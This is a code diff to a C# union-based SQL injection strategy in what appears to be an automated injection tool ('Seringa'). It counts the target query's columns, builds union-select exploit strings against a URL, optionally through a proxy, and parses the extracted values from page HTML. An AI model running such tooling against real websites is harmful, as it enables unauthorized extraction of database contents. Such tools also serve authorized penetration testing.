@@ -31,15 +31,19 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
         #region IInjectionStrategy
 
+        public int NrColumnsInOriginalQuery
+        {
+            get
+            {
+                return _nrCols;
+            }
+        }
+
         public int NumberOfResultsPerRequest
         {
             get
             {
                 return _nrVisibleCols;
-            }
-            set
-            {
-
             }
         }
 
@@ -113,7 +117,11 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
                 {
                     if (i > 0)
                     {
-                        _nrCols = i;
+                        _nrCols = i+1;
+
+                        if (!string.IsNullOrEmpty(MappingFile))
+                            XmlHelpers.ChangeMappingFileAttributeValue(MappingFile,"map/injection-strategy","nr-columns-original-query", _nrCols.ToString());
+
                         var stringResults = HtmlHelpers.GetMultipleAnswersFromHtml(pageHtml, query, ExploitDetails, DetailedExceptions);
                         _visibleColumnIndexes = stringResults.Where(r => !string.IsNullOrEmpty(r)).Distinct().Select(r => int.Parse(r)).ToList();
                         _nrVisibleCols = _visibleColumnIndexes.Count();
@@ -190,23 +198,26 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
             StringBuilder sbCurExploit = new StringBuilder();
             
             int columnIndexCounter = 0;
+            string _previousGeneratedPayload = string.Empty;
 
             for (int j = 0; j < _nrCols; j++)
             {
                 if (PayloadDetails.ExpectedResultType == Enums.ExpectedResultType.Multiple)
-                    generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom+j);
+                    generatedPayload = string.Format(PayloadHelpers.GetSingleResultLimiter(PayloadDetails.Dbms), generatedPayload, startingFrom + j);
 
-                if (_visibleColumnIndexes.Contains(j))
+                if (_visibleColumnIndexes.Contains(j) && _previousGeneratedPayload != generatedPayload)
                 {
-                    sbCurExploit.AppendFormat("{0}|{1}",_visibleColumnIndexes[columnIndexCounter],generatedPayload);
+                    sbCurExploit.AppendFormat(GeneralPayloads.UnionBasedSelectCountedResultWrapper, _visibleColumnIndexes[columnIndexCounter], generatedPayload);
+                    _previousGeneratedPayload = generatedPayload;
                     columnIndexCounter++;
                 }
                 else
                     sbCurExploit.AppendFormat(j.ToString());
-                
+
                 if (j < _nrCols - 1)
                     sbCurExploit.Append(",");
             }
+
 
             string query = QueryHelper.CreateQuery(Url, ExploitDetails.Exploit, sbCurExploit.ToString());
             string pageHtml = QueryRunner.GetPageHtml(query, UseProxy ? ProxyDetails : null);
@@ -220,7 +231,7 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
             foreach (string singleResult in resultsBatch)
             {
                 
-                separatorIndex = singleResult.IndexOf("|");
+                separatorIndex = singleResult.IndexOf(GeneralPayloads.UnionBasedResultSeparator);
                 if (separatorIndex != -1)
                 {
                     columnIndexString = singleResult.Substring(0,separatorIndex);
@@ -229,8 +240,10 @@ namespace Seringa.Engine.Implementations.InjectionStrategies
 
                     if (columnsProcessed.Contains(columnIndex))
                         continue;
+                    else
+                        columnsProcessed.Add(columnIndex);
 
-                    actualValue = singleResult.Substring(separatorIndex+1);
+                    actualValue = singleResult.Substring(separatorIndex + GeneralPayloads.UnionBasedResultSeparator.Length);
 
                     if (!string.IsNullOrEmpty(MappingFile))
                         XmlHelpers.SaveToMappingFile(MappingFile, PayloadDetails, actualValue, this);
